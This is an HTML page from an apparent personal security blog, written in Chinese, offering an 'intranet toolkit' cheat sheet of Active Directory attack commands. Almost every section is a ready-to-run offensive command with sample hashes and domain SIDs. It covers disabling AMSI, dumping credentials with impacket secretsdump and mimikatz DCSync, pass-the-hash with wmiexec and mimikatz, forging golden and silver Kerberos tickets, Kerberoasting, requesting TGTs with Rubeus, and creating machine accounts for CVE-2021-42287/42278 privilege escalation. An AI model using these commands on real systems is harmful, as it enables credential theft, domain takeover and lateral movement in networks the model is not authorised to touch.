@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>内网工具包 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5185\u7f51\u5de5\u5177\u5305", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_2" },
+              {title: "\u5173\u95edamsi", url: "#amsi" },
+              {title: "\u8bbe\u7f6e\u53ef\u52a0\u8f7d\u811a\u672c", url: "#_3" },
+              {title: "\u67e5\u770b\u51fd\u6570\u5e2e\u52a9\u6587\u6863", url: "#_4" },
+              {title: "\u5c06powershell\u7ed3\u679c\u8f93\u51fa\u4fdd\u5b58", url: "#powershell" },
+              {title: "impacket", url: "#impacket" },
+              {title: "empire", url: "#empire" },
+              {title: "mimikatz", url: "#mimikatz" },
+              {title: "powersploit", url: "#powersploit" },
+              {title: "Rubeus", url: "#rubeus" },
+              {title: "\u6742", url: "#_9" },
+              {title: "SharpRDP", url: "#sharprdp" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/" class="btn btn-xs btn-link">
+        独立工具
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/" class="btn btn-xs btn-link">
+        内网侦查
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">内网工具包</h1>
+<h2 id="_2">目录</h2>
+<ul>
+<li><a href="#关闭amsi">关闭amsi</a></li>
+<li><a href="#设置可加载脚本">设置可加载脚本</a></li>
+<li><a href="#查看函数帮助文档">查看函数帮助文档</a></li>
+<li><a href="#将powershell结果输出保存">将powershell结果输出保存</a></li>
+<li><a href="#impacket">impacket</a><ul>
+<li><a href="#通用选项">通用选项</a></li>
+<li><a href="#secretsdump-dumphash">secretsdump dumphash</a></li>
+<li><a href="#wmiexec-pth">wmiexec pth</a></li>
+<li><a href="#ticketer-金银票据伪造">ticketer 金银票据伪造</a></li>
+<li><a href="#ticketConverter-ccache与kirbi互转脚本">ticketConverter ccache与kirbi互转脚本</a></li>
+<li><a href="#GetUserSPNs-查询域内SPN">GetUserSPNs 查询域内SPN</a></li>
+<li><a href="#smbserver-搭建smb服务器">smbserver 搭建smb服务器</a></li>
+<li><a href="#远程读注册表">远程读注册表</a></li>
+</ul>
+</li>
+<li><a href="#empire">empire</a></li>
+<li><a href="#mimikatz">mimikatz</a><ul>
+<li><a href="#DCsync">DCsync</a></li>
+<li><a href="#pth">pth</a></li>
+<li><a href="#黄金票据">黄金票据</a></li>
+</ul>
+</li>
+<li><a href="#powersploit">powersploit</a><ul>
+<li><a href="#powerview">powerview</a><ul>
+<li><a href="#查看域信任">查看域信任</a></li>
+<li><a href="#查看acl">查看acl</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#Rubeus">Rubeus</a><ul>
+<li><a href="#获取tgt">获取tgt</a></li>
+</ul>
+</li>
+<li><a href="#杂">杂</a><ul>
+<li><a href="#Powermad">Powermad</a></li>
+</ul>
+</li>
+<li><a href="#SharpRDP">SharpRDP</a></li>
+</ul>
+<h2 id="amsi">关闭amsi</h2>
+<pre><code class="language-纯文本">Remove-Item -Path &quot;HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}&quot; -Recurse
+
+恢复命令
+
+New-Item -Path &quot;HKLM:\SOFTWARE\Microsoft\AMSI\Providers&quot; -Name &quot;{2781761E-28E0-4109-99FE-B9D127C57AFE}&quot; -ErrorAction Ignore | Out-Null
+
+</code></pre>
+<h2 id="_3">设置可加载脚本</h2>
+<pre><code class="language-纯文本">set-executionpolicy remotesigned
+</code></pre>
+<h2 id="_4">查看函数帮助文档</h2>
+<pre><code class="language-纯文本">function_name -?
+get-help function_name -examples
+get-help function_name -detailed
+
+
+</code></pre>
+<h2 id="powershell">将powershell结果输出保存</h2>
+<pre><code class="language-纯文本">｜out-file -filepath c:/xx/x/xx
+</code></pre>
+<h2 id="impacket">impacket</h2>
+<p>Python写的的内网工具包</p>
+<p>教程<a href="https://xz.aliyun.com/t/11877" title="https://xz.aliyun.com/t/11877">https://xz.aliyun.com/t/11877</a></p>
+<h3 id="_5">通用选项</h3>
+<p>hash认证</p>
+<pre><code class="language-纯文本">py -3  xxx.py  domain/user@ip -hashes :161cff084477fe596a5db81874498a24
+</code></pre>
+<p>Kerberos认证</p>
+<pre><code class="language-纯文本">export KRB5CCNAME=ad01.ccache 
+py -3  xxx.py  -k -no-pass
+</code></pre>
+<h3 id="secretsdump-dumphash">secretsdump dumphash</h3>
+<p><strong>基于NTLM认证，使用机器用户导出</strong></p>
+<pre><code class="language-纯文本">py -3 secretsdump.py -hashes 5f8506740ed68996ffd4e5cf80cb5174:5f8506740ed68996ffd4e5cf80cb5174 &quot;domain/DC$@DCIP&quot; -just-dc-user krbtgt
+</code></pre>
+<p><strong>基于Kerberos票据导出</strong></p>
+<pre><code class="language-纯文本">export KRB5CCNAME=ad01.ccache 
+
+py -3 [secretsdump.py](http://secretsdump.py) -k -no-pass [AD01.test.com](http://AD01.test.com) -dc-ip 192.168.111.146 -target-ip 192.168.111.146 -just-dc-user krbtgt
+</code></pre>
+<p><strong>本地解密SAM</strong></p>
+<pre><code class="language-纯文本">py -3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+</code></pre>
+<h3 id="wmiexec-pth">wmiexec pth</h3>
+<p>横向脚本</p>
+<pre><code class="language-纯文本">python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 Administrator@10.10.10.10
+</code></pre>
+<h3 id="ticketer">ticketer 金银票据伪造</h3>
+<p><strong>银票</strong></p>
+<p>使用win-7\$的机器账户的hash96dd976cc094ca1ddb2f06476fb61eb6伪造cifs/win-7的服务票据，使用票据的用户是根本不存在的qqq或者存在的任意用户。</p>
+<pre><code class="language-纯文本">py -3 .\ticketer.py -spn cifs/win-7 -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -domain test.com -nthash 96dd976cc094ca1ddb2f06476fb61eb6 qqq
+</code></pre>
+<p><strong>金牌</strong></p>
+<p>在银票的命令基础上去掉-spn，将nthash修改为krbtgt的hash即可。</p>
+<pre><code class="language-纯文本">py -3 .\ ticketer.py  -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -domain  test.com  -nthash 96dd976cc094ca1ddb2f06476fb61eb6 qqq
+</code></pre>
+<h3 id="ticketconverter-ccachekirbi"><a href="http://ticketConverter.py" title="ticketConverter">ticketConverter</a> ccache与kirbi互转脚本</h3>
+<pre><code class="language-纯文本">py -3 .\ticketConverter.py .\administrator.ccache .\administrator.kirbi
+
+</code></pre>
+<h3 id="getuserspns-spn">GetUserSPNs 查询域内SPN</h3>
+<p>可使用密码认证、hash认证、Kerberos认证</p>
+<pre><code class="language-纯文本">py -3 GetUserSPNs.py test.com/administrator:1qaz@WSX -target-domain test.com
+</code></pre>
+<h3 id="smbserver-smb">smbserver 搭建smb服务器</h3>
+<pre><code class="language-纯文本">python smbserver.py demo /opt/
+
+远程拉文件 copy samrdump.exe \\192.168.3.137\demo
+
+</code></pre>
+<h3 id="_6">远程读注册表</h3>
+<p>有时候拿到hash或密码不能直接pth上去，可以读注册表看看有什么发现</p>
+<pre><code class="language-纯文本">impacket-reg -hashes ':e53d87d42adaa3ca32bdb34a876cbffb' -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE -s &gt; henry_reg.txt
+</code></pre>
+<h2 id="empire">empire</h2>
+<h2 id="mimikatz">mimikatz</h2>
+<p>不解释</p>
+<h3 id="dcsync">DCsync</h3>
+<pre><code class="language-纯文本"># 导出域内指定用户的信息(包括哈希值)
+lsadump::dcsync /domain:whoamianony.org /user:administrator 
+lsadump::dcsync /domain:whoamianony.org /user:administrator /csv
+
+# 导出域内所有用户的信息(包括哈希值)
+lsadump::dcsync /domain:whoamianony.org /all    
+lsadump::dcsync /domain:whoamianony.org /all /csv
+</code></pre>
+<h3 id="pth">pth</h3>
+<pre><code class="language-纯文本">sekurlsa::pth /user:administrator /domain:&quot;xxx.com&quot; /ntlm:6542d35ed5ff6ae5e75b875068c5d3bc  //自行修改
+然后会弹出管理员cmd shell
+试试读域控文件 net use \\192.168.222.131\c$
+
+</code></pre>
+<h3 id="_7">黄金票据</h3>
+<pre><code class="language-纯文本">wmic useraccount get name,sid 获取sid
+
+这里得到 administrator 的 SID 为 S-1-5-21-284927032-1122706408-2778656994-500，即表示当前域的 SID 就是 S-1-5-21-284927032-1122706408-2778656994（用的时候去掉最后的‐500，500表示为administrator用户）
+
+</code></pre>
+<pre><code class="language-纯文本">mimikatz lsadump::dcsync /domain:hack.com /user:krbtgt 导出krbtgt hash
+</code></pre>
+<p><img alt="" src="../image/image_FFpPTHMfif.png" /></p>
+<pre><code class="language-纯文本">mimikatz kerberos::purge 
+清除已有票据
+
+kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi 
+生成黄金票据，并保存到golden.kiribi
+
+kerberos::ptt golden.kiribi
+导入黄金票据到内存
+
+ls \\dc\c$ 利用
+</code></pre>
+<h2 id="powersploit">powersploit</h2>
+<p>ps1的内网工具包</p>
+<h3 id="powerview">powerview</h3>
+<p>信息搜集工具</p>
+<h4 id="_8">查看域信任</h4>
+<pre><code class="language-纯文本">get-domaintrust -domain name 
+</code></pre>
+<h4 id="acl">查看acl</h4>
+<pre><code class="language-纯文本">Get-ObjectAcl -samAccountName username -ResolveGUIDs
+</code></pre>
+<h2 id="rubeus">Rubeus</h2>
+<p>滥用Kerberos的工具</p>
+<h3 id="tgt">获取tgt</h3>
+<p>impacket也可以做到</p>
+<pre><code class="language-纯文本">Rubeus.exe asktgt /user:DC /password:******* /domain:attack.local /dc:attack.local /nowrap
+</code></pre>
+<h2 id="_9">杂</h2>
+<h3 id="powermad">Powermad</h3>
+<p>用于与机器账户交涉。如CVE-2021-42287\&amp;CVE-2021-42278 域内提权，可用它来创建机器用户</p>
+<pre><code class="language-纯文本">Import-Module .\Powermad.ps1;New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force)
+</code></pre>
+<h2 id="sharprdp">SharpRDP</h2>
+<p>使用rdp协议进行横向，可以绕过smb不可用等情况</p>
+<p><a href="https://github.com/0xthirteen/SharpRDP" title="https://github.com/0xthirteen/SharpRDP">https://github.com/0xthirteen/SharpRDP</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/" class="btn btn-xs btn-link">
+        独立工具
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/" class="btn btn-xs btn-link">
+        内网侦查
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
